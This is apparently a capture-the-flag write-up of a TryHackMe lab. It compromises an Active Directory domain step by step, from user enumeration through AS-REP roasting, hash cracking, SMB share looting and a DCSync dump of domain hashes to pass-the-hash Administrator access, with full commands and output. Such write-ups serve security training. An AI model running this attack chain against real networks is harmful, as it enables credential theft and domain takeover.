> https://tryhackme.com/room/attacktivedirectory

# Recon

## Nmap

```bash
# Nmap 7.93 scan initiated Sun Apr 23 06:31:19 2023 as: nmap -sVC -p- -T4 -Pn -vv -oA attacktive 10.10.80.193
Nmap scan report for 10.10.80.193
Host is up, received user-set (0.28s latency).
Scanned at 2023-04-23 06:31:20 EDT for 661s
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2023-04-23 10:41:06Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2023-04-23T10:42:13+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-04-22T10:31:08
| Not valid after:  2023-10-22T10:31:08
| MD5:   e3c2a9af9b6869bf124ed25879b70f76
| SHA-1: b33d1946b4064d11c3745a88dd829fa3db649818
...
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-04-23T10:42:03+00:00
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2023-04-23T10:42:05
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 25301/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24099/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27996/udp): CLEAN (Failed to receive data)
|   Check 4 (port 34602/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 23 06:42:21 2023 -- 1 IP address (1 host up) scanned in 661.80 seconds
```

Add to hosts

```bash
echo '10.10.80.193 spookysec.local' >> /etc/hosts
```

## CrackMapExec

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# cme smb 10.10.80.193
SMB         10.10.80.193    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
```

# Task 4  Enumeration Enumerating Users via Kerberos

## Kerbrute

Brute force discovery of users, passwords and even password spray

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /opt/kerbrute

┌──(root㉿kali)-[~/AttacktiveDirect]
└─# chmod +x /opt/kerbrute
```

Download wordlists

```bash
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
```

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# /opt/kerbrute userenum --dc 10.10.80.193 -d spookysec.local userlist.txt -t 100

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 04/23/23 - Ronnie Flathers @ropnop

2023/04/23 07:15:05 >  Using KDC(s):
2023/04/23 07:15:05 >   spookysec.local:88

2023/04/23 07:15:05 >  [+] VALID USERNAME:       james@spookysec.local
2023/04/23 07:15:05 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2023/04/23 07:15:06 >  [+] VALID USERNAME:       James@spookysec.local
2023/04/23 07:15:06 >  [+] VALID USERNAME:       robin@spookysec.local
2023/04/23 07:15:09 >  [+] VALID USERNAME:       darkstar@spookysec.local
2023/04/23 07:15:10 >  [+] VALID USERNAME:       administrator@spookysec.local
2023/04/23 07:15:13 >  [+] VALID USERNAME:       backup@spookysec.local
2023/04/23 07:15:15 >  [+] VALID USERNAME:       paradox@spookysec.local
2023/04/23 07:15:23 >  [+] VALID USERNAME:       JAMES@spookysec.local
2023/04/23 07:15:27 >  [+] VALID USERNAME:       Robin@spookysec.local
2023/04/23 07:15:44 >  [+] VALID USERNAME:       Administrator@spookysec.local
2023/04/23 07:16:22 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2023/04/23 07:16:34 >  [+] VALID USERNAME:       Paradox@spookysec.local
2023/04/23 07:17:15 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2023/04/23 07:17:26 >  [+] VALID USERNAME:       ori@spookysec.local
2023/04/23 07:17:47 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2023/04/23 07:18:40 >  Done! Tested 73317 usernames (16 valid) in 215.623 second
```

> `svc-admin` and `backup` are high value users

# Task 5  Exploitation Abusing Kerberos

## ASREPRoasting

Get users with "Does not require Pre-Authentication" set

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# impacket-GetNPUsers -usersfile kerbrute_users.txt spookysec.local/
Impacket v0.10.1.dev1+20230413.195351.6328a9b7 - Copyright 2022 Fortra

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:4bd2a73e2d1bc690e7b55841c1ad30c8$419ef2151b4f1f490ca07ac8da11a2929da4498cfb0d4546c42559b9e9b504029685251096a132eaae90f9e58989b7549c72cdb1697345db0b1914731756ed4a2e49137b3e4a018789dec88c71dfc18434f65f091421cfd34c07c0c859abd164d33027452cdb4b4c9a9d0f7d040a249e5f4d23eb0d353ef52539920c39162562381b350b6da1a9256f1839cf14514e0a6ce106d3a2d40c262529a25b86fc7ea20c4ac65293dc5de29a4d9e43b8d6d2e9a82a81e994039909aa01e61dab205c620a412d7356215e8bff32fb54f94489d9e559c52264ed719e7236194892f627cc89ec4484120259137a371e41156f7880182b
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User JAMES doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User DARKSTAR doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ROBIN doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Crack the hash

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# hashcat asrep.hash passwordlist.txt
...
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:4bd2a...2b:management2005
```

# Task 6  Enumeration Back to the Basics

## CrackMapExec

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# cme smb 10.10.80.193 -u 'svc-admin' -p 'management2005' --shares
SMB         10.10.80.193    445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
SMB         10.10.80.193    445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005
SMB         10.10.80.193    445    ATTACKTIVEDIREC  [+] Enumerated shares
SMB         10.10.80.193    445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.10.80.193    445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.10.80.193    445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.10.80.193    445    ATTACKTIVEDIREC  backup          READ
SMB         10.10.80.193    445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.10.80.193    445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.10.80.193    445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share
SMB         10.10.80.193    445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share
```

## smbmap

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# smbmap -u svc-admin -p management2005 -d spookysec -H 10.10.80.193
[+] IP: 10.10.80.193:445        Name: spookysec.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  READ ONLY
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```

## smbclient

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# smbclient -U 'svc-admin' '//spookysec.local/backup'
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3645316 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> ^C

┌──(root㉿kali)-[~/AttacktiveDirect]
└─# cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw 

┌──(root㉿kali)-[~/AttacktiveDirect]
└─# echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
backup@spookysec.local:backup2517860 
```

## impacket-smbclient

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# impacket-smbclient svc-admin:management2005@spookysec.local
Impacket v0.10.1.dev1+20230413.195351.6328a9b7 - Copyright 2022 Fortra

Type help for list of commands
# shares
ADMIN$
backup
C$
IPC$
NETLOGON
SYSVOL
# use backup
# ls
drw-rw-rw-          0  Sat Apr  4 15:08:39 2020 .
drw-rw-rw-          0  Sat Apr  4 15:08:39 2020 ..
-rw-rw-rw-         48  Sat Apr  4 15:08:53 2020 backup_credentials.txt
# mget *
[*] Downloading backup_credentials.txt
```

# Task 7  Domain Privilege Escalation Elevating Privileges within the Domain

```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# impacket-secretsdump backup:backup2517860@spookysec.local
Impacket v0.10.1.dev1+20230413.195351.6328a9b7 - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
...
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:7f7bf5be8ecd79b74e38e1916423f7a4:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
...
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:0d4f5e06c11ab674221a924faeb27be9d1c0fe37003c34676d3dcf40e49fb7fa
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:4ae49c9d40edcc901e990c7441c906a1
ATTACKTIVEDIREC$:des-cbc-md5:02157acb3bd97049
[*] Cleaning up...
```


```bash
┌──(root㉿kali)-[~/AttacktiveDirect]
└─# evil-winrm -i spookysec.local -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'
...
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

